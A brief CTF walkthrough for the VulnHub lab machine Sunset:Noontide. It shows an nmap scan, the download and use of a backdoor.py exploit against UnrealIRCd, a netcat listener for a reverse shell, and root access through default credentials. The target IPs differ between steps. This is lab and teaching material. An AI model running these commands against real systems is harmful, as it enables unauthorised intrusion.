
# Sunset:Noontide Walkthrough

**VulnHub Link:** [Sunset:Noontide](https://www.vulnhub.com/entry/sunset-noontide,531/)
**Difficulty:** Easy  
**Release Date:** 9 Aug 2020

---

## 1. Reconnaissance

### Nmap Scan

nmap -A -O -T4 -P -sV 192.168.100.130

PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd

## 2.Enumeration

wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Sunset%3ANoontide/backdoor.py

python backdoor.py 192.168.100.165 6667 192.168.100.14 1234

opening another terminal --> nc -nvlp 1234

## 3.Privilege Escalation

local.txt found as user server

and we found out default credentials ---> root:root 

BINGO.!!! Root flag captured
